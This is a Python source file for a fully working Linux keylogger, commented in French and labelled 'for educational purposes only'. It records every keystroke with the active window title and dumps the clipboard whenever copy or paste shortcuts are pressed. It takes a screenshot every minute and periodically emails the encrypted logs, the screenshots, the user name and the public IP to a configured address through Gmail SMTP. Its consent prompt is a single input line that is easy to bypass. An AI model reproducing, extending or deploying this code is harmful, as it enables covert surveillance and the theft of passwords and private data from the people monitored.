#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#  ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗   ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
#  ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗ ██╔════╝ ██╔═══██╗██╔═══██╗██╔════╝██╔══██╗
#  █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║ ██║  ███╗██║   ██║██║   ██║█████╗  ██████╔╝
#  ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║ ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
#  ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝ ╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
#  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
#                                    KEYLOGGER (Édition Linux)

# ⚠️ À DES FINS ÉDUCATIVES UNIQUEMENT. UTILISER AVEC CONSENTEMENT EXPLICITE ⚠️
#!/usr/bin/env python3

import os
import tempfile
import threading
import datetime
import logging
import smtplib
import socket
import requests
import hashlib
import clipboard
import sys
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pynput import keyboard
from cryptography.fernet import Fernet
from mss import mss

class EnhancedKeylogger:
    EMAIL_SUBJECT_PREFIX = "Rapport Keylogger -"

    def __init__(self, log_interval=300, screenshot_interval=60,
                 from_email=None, password=None, to_email=None,
                 encryption_key=None):
        self.log = ""
        self.log_interval = log_interval
        self.screenshot_interval = screenshot_interval
        self.from_email = from_email
        self.password = password
        self.to_email = to_email
        self.pictures = []
        self.mail = MIMEMultipart()
        self.status = True
        self.user = os.getenv("USER", "Unknown")
        self.current_key_list = set()
        self.COMBINATIONS = [
            {keyboard.Key.ctrl, keyboard.KeyCode(char='c')},
            {keyboard.Key.ctrl, keyboard.KeyCode(char='v')},
            {keyboard.Key.ctrl, keyboard.KeyCode(char='x')}
        ]
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
        self._setup_logging()
        self._validate_config()

    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('keylogger_audit.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        logging.info("Keylogger initialisé avec chiffrement")

    def _validate_config(self):
        if not self.from_email or not self.password or not self.to_email:
            logging.warning("Configuration email incomplète")

    def _secure_temp_file(self, suffix='.jpg'):
        fd, path = tempfile.mkstemp(suffix=suffix)
        os.close(fd)
        return path

    def encrypt_data(self, data):
        return self.fernet.encrypt(data.encode())

    def _generate_log_hash(self, data):
        return hashlib.sha256(data.encode()).hexdigest()

    def take_screenshot(self):
        """Capture et stocke une capture d'écran en utilisant mss."""
        try:
            with mss() as sct:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                path = self._secure_temp_file()
                sct.shot(output=path)
                self.pictures.append({"filename": f"screenshot_{timestamp}.jpg", "path": path})
                if len(self.pictures) >= 5:
                    self.report(2)
            threading.Timer(self.screenshot_interval, self.take_screenshot).start()
        except Exception as e:
            logging.error(f"Erreur capture d'écran: {e}")

    def prepare_screenshots(self):
        for file in self.pictures:
            try:
                with open(file["path"], "rb") as img:
                    attachment = MIMEImage(img.read(), name=file["filename"])
                    self.mail.attach(attachment)
                os.remove(file["path"])
            except Exception as e:
                logging.error(f"Erreur traitement capture d'écran: {e}")

    def get_active_window_title(self):
        try:
            import subprocess
            win_id = subprocess.check_output(["xdotool", "getactivewindow"]).strip()
            window_name = subprocess.check_output(["xdotool", "getwindowname", win_id]).strip()
            return window_name.decode("utf-8")
        except Exception:
            return "Récupération fenêtre échouée"

    def on_press(self, key):
        current_key = ""
        try:
            if any(key in combo for combo in self.COMBINATIONS):
                self.current_key_list.add(key)
                if any(all(k in self.current_key_list for k in combo) for combo in self.COMBINATIONS):
                    current_key += "\n[CLIPBOARD START]\n"
                    try:
                        current_key += clipboard.paste()
                    except Exception:
                        current_key += "[Lecture presse-papiers échouée]"
                    current_key += "\n[CLIPBOARD END]\n"
            if key == keyboard.Key.enter:
                current_key += "\n"
            elif key == keyboard.Key.space:
                current_key += " "
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1] if self.log else ""
            else:
                current_key += getattr(key, 'char', '')
            if current_key:
                window_title = self.get_active_window_title()
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                self.log += f"[{timestamp} - {window_title}] {current_key}"
        except Exception as e:
            logging.error(f"Erreur traitement touche: {e}")

    def on_release(self, key):
        try:
            if any(key in combo for combo in self.COMBINATIONS):
                self.current_key_list.discard(key)
        except Exception as e:
            logging.error(f"Erreur relâchement touche: {e}")

    def report(self, condition=1):
        try:
            if condition == 1:
                log_hash = self._generate_log_hash(self.log)
                encrypted_log = self.encrypt_data(self.log)
                self._send_email(f"Hash: {log_hash}\n\nEncrypted:\n{encrypted_log.decode()}")
                self.log = ""
                threading.Timer(self.log_interval, self.report).start()
            elif condition == 2:
                self.prepare_screenshots()
                self._send_email()
                self.pictures = []
            elif condition == 3:
                self._send_email()
                threading.Timer(self.log_interval, self.report).start()
        except Exception as e:
            logging.error(f"Erreur rapport: {e}")
        finally:
            self.mail = MIMEMultipart()

    def _send_email(self, encrypted_log=None):
        retries = 3
        for attempt in range(retries):
            try:
                if encrypted_log:
                    self.mail.attach(MIMEText(encrypted_log, "plain"))
                if self.status:
                    self.status = False
                    self.mail.attach(MIMEText(self._system_info(), "html"))
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
                self.mail["Subject"] = f"{self.EMAIL_SUBJECT_PREFIX} {self.user} @ {timestamp}"
                self.mail["From"] = self.from_email
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(self.from_email, self.password)
                    server.sendmail(self.from_email, self.to_email, self.mail.as_string())
                return
            except Exception as e:
                logging.error(f"Tentative envoi email {attempt+1} échouée: {e}")
                time.sleep(3)
        logging.critical("Toutes les tentatives d'envoi email ont échoué.")

    def _system_info(self):
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "Non disponible"
        private_ip = socket.gethostbyname(socket.gethostname())
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        return f"""
        <h3>Informations Système</h3>
        <p><b>Utilisateur:</b> {self.user}</p>
        <p><b>Heure:</b> {timestamp}</p>
        <p><b>IP Publique:</b> {public_ip}</p>
        <p><b>IP Privée:</b> {private_ip}</p>
        <hr>
        """

    def start(self):
        try:
            consent = input("Avez-vous le consentement explicite pour exécuter ceci ? (o/n): ")
            if consent.lower() not in ['o', 'y']:
                logging.warning("Abandonné: Consentement non confirmé")
                return
            logging.info("Démarrage du keylogger avec vérification du consentement")
            listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            with listener:
                self.take_screenshot()
                self.report(3)
                listener.join()
        except KeyboardInterrupt:
            logging.info("Keylogger arrêté par l'utilisateur")
        except Exception as e:
            logging.error(f"Erreur d'exécution: {e}")
        finally:
            logging.info("Session keylogger terminée")

if __name__ == "__main__":
    print("""
    KEYLOGGER AMÉLIORÉ - OUTIL DE SURVEILLANCE SÉCURISÉ
    ====================================================
    Utiliser uniquement avec consentement explicite à des fins autorisées
    L'utilisation non autorisée viole les lois sur la vie privée et l'éthique
    ====================================================
    """)
    try:
        keylogger = EnhancedKeylogger(
            log_interval=300,
            screenshot_interval=60,
            from_email=os.getenv("SENDER_EMAIL"),
            password=os.getenv("EMAIL_PASSWORD"),
            to_email=os.getenv("RECEIVER_EMAIL")
        )
        keylogger.start()
    except Exception as e:
        logging.critical(f"Initialisation échouée: {e}")
